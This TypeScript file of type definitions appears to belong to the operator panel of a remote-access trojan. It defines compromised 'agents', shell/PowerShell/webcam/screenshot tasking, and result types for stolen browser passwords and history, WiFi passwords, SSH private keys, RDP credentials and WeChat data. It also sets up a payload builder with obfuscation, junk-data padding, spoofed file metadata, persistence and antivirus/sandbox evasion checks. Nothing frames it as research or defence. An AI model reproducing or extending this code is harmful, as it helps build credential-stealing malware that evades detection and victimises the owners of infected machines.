export type AgentStatus = 'Online' | 'Offline' | 'Sleeping' | 'Compromised';
export type TaskStatus = 'Pending' | 'Sent' | 'Running' | 'Completed' | 'Failed' | 'Cancelled';
export type UserRole = 'Operator' | 'Admin';
export type CommandType = 'Shell' | 'PowerShell' | 'LocalAccounts' | 'Upload' | 'Download' | 'Screenshot' | 'Webcam' | 'WifiScan' | 'Kill' | 'Sleep' | 'Proxy';

export interface GeoInfo {
  publicIp: string;
  region: string;
  isp: string;
  asn: string;
  llc: string;
  latitude: number;
  longitude: number;
}

export interface AgentListItem {
  id: string;
  hostname: string;
  userName: string;
  ipAddress: string;
  osVersion: string;
  status: AgentStatus;
  lastSeen: string;
  geo?: GeoInfo;
}

export interface CpuInfo {
  name: string;
  physicalCores: number;
  logicalCores: number;
  maxClockMHz: number;
}

export interface GpuInfo {
  name: string;
  driverVersion?: string;
  vramBytes?: number;
}

export interface DiskInfo {
  model: string;
  sizeBytes: number;
  mediaType?: string;
  serialNumber?: string;
}

export interface RamInfo {
  totalBytes: number;
}

export interface DisplayInfo {
  name: string;
  width: number;
  height: number;
}

export interface HardwareInfo {
  cpu?: CpuInfo;
  gpus: GpuInfo[];
  disks: DiskInfo[];
  ram?: RamInfo;
  displays: DisplayInfo[];
  motherboardVendor?: string;
  biosVersion?: string;
}

export interface AgentDetail extends AgentListItem {
  arch: string;
  userName: string;
  processName: string;
  pid: number;
  isElevated: boolean;
  hwid?: string;
  firstSeen: string;
  heartbeatInterval: number;
  hardware?: HardwareInfo;
  metadata: Record<string, string>;
}

export interface AgentTask {
  id: string;
  agentId: string;
  createdBy: string;
  commandType: CommandType;
  command: string;
  arguments?: string[];
  status: TaskStatus;
  output?: string;
  error?: string;
  createdAt: string;
  dispatchedAt?: string;
  completedAt?: string;
  timeoutSeconds: number;
}

export interface TaskCreateRequest {
  agentId: string;
  commandType: CommandType;
  command: string;
  arguments?: string[];
  timeoutSeconds?: number;
}

export interface LoginRequest {
  username: string;
  password: string;
}

export interface SetupRequest {
  username: string;
  password: string;
  confirmPassword: string;
}

export interface LoginResponse {
  token: string;
  refreshToken: string;
  expiresAt: string;
  username: string;
  role: UserRole;
}

export interface AuditLog {
  id: string;
  timestamp: string;
  userId: string;
  userName: string;
  action: string;
  targetAgentId?: string;
  details?: string;
  ipAddress: string;
  success: boolean;
  risk?: string;
}

export interface WsMessage {
  type: string;
  channel: string;
  data: unknown;
  ts: number;
  rid?: string;
}

export interface PagedResponse<T> {
  items: T[];
  total: number;
  page: number;
  pageSize: number;
}

export interface TrafficRecord {
  id: string;
  agentId: string;
  hostname: string;
  bytesSent: number;
  bytesReceived: number;
  timestamp: string;
}

export interface AuditLogEntry {
  id: string;
  timestamp: string;
  userId: string;
  userName: string;
  action: string;
  targetAgentId?: string;
  details?: string;
  ipAddress: string;
  success: boolean;
  risk?: string;
}

// ── System Info types ────────────────────────────────────────────────

export interface ProcessItem {
  pid: number;
  name: string;
  startTime: string;
  cpuMs: number;
  memoryBytes: number;
  threadCount: number;
}

export interface ProcessListResult {
  changed: boolean;
  hash?: string;
  processes?: ProcessItem[];
}

export interface WindowItem {
  hwnd: number;
  title: string;
  processId: number;
  processName: string;
  className: string;
}

export interface WindowListResult {
  windows: WindowItem[];
  supported: boolean;
}

export interface EnvVar {
  name: string;
  value: string;
}

export interface EnvVarsResult {
  system: EnvVar[];
  user: EnvVar[];
}

export interface NetworkInterface {
  name: string;
  type: string;
  mac: string;
  speed: number;
  ipv4: string[];
  ipv6: string[];
}

export interface WanInfo {
  publicIp: string;
  gateway: string;
  region: string;
  isp: string;
  asn: string;
  llc: string;
  latitude: number;
  longitude: number;
}

export interface WifiProfile {
  ssid: string;
  password: string;
}

export interface NearbyWifiNetwork {
  ssid: string;
  auth: string;
  encryption: string;
  bssid: string;
  signal: number;
  band: string;
}

export interface ProxyInfo {
  enabled: boolean;
  server: string;
  port: number;
  bypass: string;
}

export interface NetworkResult {
  interfaces: NetworkInterface[];
  wan: WanInfo;
  wifi: WifiProfile[];
  nearbyWifi: NearbyWifiNetwork[];
  proxy: ProxyInfo;
  dnsSuffix: string;
}

export interface LanDevice {
  ip: string;
  mac: string;
  hostname: string;
  source: string;
}

export interface LanScanResult {
  devices: LanDevice[];
  subnets: string[];
}

// ── Packages / Docker types ───────────────────────────────────────────

export interface PackageItem {
  name: string;
  version: string;
  arch?: string;
  manager: string;
}

export interface PackagesResult {
  pm: string;
  total: number;
  packages: PackageItem[];
  error?: string;
}

export interface DockerContainer {
  id: string;
  name: string;
  image: string;
  status: string;
}

export interface DockerResult {
  inContainer: boolean;
  socketPresent: boolean;
  cliAvailable: boolean;
  total: number;
  containers: DockerContainer[];
}

// ── Software Data types ─────────────────────────────────────────────

export interface WeChatAccount {
  wxid: string;
  fileDirs: string[];
  path: string;
}

export interface WeChatResult {
  accounts: WeChatAccount[];
}

// ── Browser Stealer types ────────────────────────────────────────────

export interface BrowserPassword {
  browser: string;
  profile: string;
  url: string;
  username: string;
  password: string;
}

export interface BrowserHistory {
  browser: string;
  profile: string;
  url: string;
  title: string;
  visits: number;
  lastVisit: number;
}

export type BrowserDataType = 'passwords' | 'history';

export interface BrowserPagedResult<T> {
  total: number;
  offset: number;
  limit: number;
  items: T[];
  errors: string[];
}

export interface BrowserSearchResult<T> {
  total: number;
  items: T[];
}

// ── SSH Key Scanner types ─────────────────────────────────────────────

export type SshKeyCategory = 'private-key' | 'public-key' | 'authorized-keys' | 'known-hosts' | 'config' | 'other';

export interface SshKeyItem {
  name: string;
  path: string;
  category: SshKeyCategory;
  encrypted: boolean;
  size: number;
  content: string;
}

export interface SSHResult {
  sshDir: string;
  total: number;
  items: SshKeyItem[];
  error?: string;
}

// ── RDP credential types ────────────────────────────────────────────────

export interface RdpCredentialItem {
  target: string;
  rawTarget: string;
  type: string;
  username: string;
  password: string;
  encrypted: boolean;
}

export interface RdpFileItem {
  path: string;
  host: string;
  username: string;
  password: string;
  encrypted: boolean;
}

export interface RDPResult {
  total: number;
  items: RdpCredentialItem[];
  rdpFiles: RdpFileItem[];
  error?: string;
}

// ── Proxy Browser types ──────────────────────────────────────────────

export interface ProxyResponse {
  status: number;
  statusText: string;
  headers: Record<string, string[]>;
  body: string;
  contentType: string;
  url: string;
  error?: string;
}

// ── Account Management types ──────────────────────────────────────────

export interface UserPermissions {
  fullAccess: boolean;
  allowedPages: string[];
  allowedActions: string[];
}

export interface AccountListItem {
  id: string;
  username: string;
  role: string;
  isActive: boolean;
  isInitial: boolean;
  createdAt: string;
  lastLogin?: string;
  permissions?: UserPermissions;
}

export interface AccountStatus {
  isInitial: boolean;
}

export interface ChangePasswordRequest {
  currentPassword: string;
  newPassword: string;
}

export interface CreateAccountRequest {
  username: string;
  password: string;
  role?: string;
  permissions?: UserPermissions;
}

export interface UpdateAccountRequest {
  username?: string;
  role?: string;
  isActive?: boolean;
  permissions?: UserPermissions;
}

export interface AccountMe {
  username: string;
  role: string;
  permissions: UserPermissions;
  agreedAt?: string;
}

// ── Builder types ──────────────────────────────────────────────────────

export interface AntiAnalysisConfig {
  /** Master toggle: enable sandbox detection */
  enabled: boolean;
  /** Check if Windows Test Signing mode is enabled */
  checkTestSigning: boolean;
  /** Check for known AV processes (Kaspersky, etc.) */
  checkAvProcesses: boolean;
}

export interface BuildConfigRequest {
  platform: string;
  applicationType: string;
  serverHost: string;
  serverPort: number;
  enableObfuscation: boolean;
  injectJunkData: boolean;
  junkDataMb: number;
  iconUrl?: string;
  companyName?: string;
  fileDescription?: string;
  productName?: string;
  copyright?: string;
  fileVersion?: string;
  stripSymbols: boolean;
  requireAdmin: boolean;
  copyToAppData: boolean;
  enablePersistence: boolean;
  antiAnalysis: AntiAnalysisConfig;
}

export type BuildStatus = 'building' | 'completed' | 'failed';

export interface BuildRecord {
  id: string;
  platform: string;
  fileName: string;
  fileSize: number;
  status: BuildStatus;
  error?: string;
  createdAt: string;
  completedAt?: string;
}

export interface BuildRecordDetail extends BuildRecord {
  config: BuildConfigRequest;
}

export interface TemplateInfo {
  platform: string;
  fileName: string;
  fileSize: number;
  updatedAt: string;
}

export interface ProxyHistoryEntry {
  url: string;
  title: string;
  method: string;
  body?: string;
  headers?: string;
}

export interface LocalAccount {
  Name: string;
  FullName?: string;
  Description?: string;
  Enabled: boolean;
  isAdmin: boolean;
  sidValue: string;
  groups: string[];
  PasswordRequired?: boolean;
  UserMayChangePassword?: boolean;
  LastLogon?: string;
  AccountExpires?: string;
  PasswordLastSet?: string;
  PasswordExpires?: string;
  ObjectClass?: string;
  PrincipalSource?: number;
}

export interface LocalAccountsResult {
  accounts: LocalAccount[];
  error?: string;
}

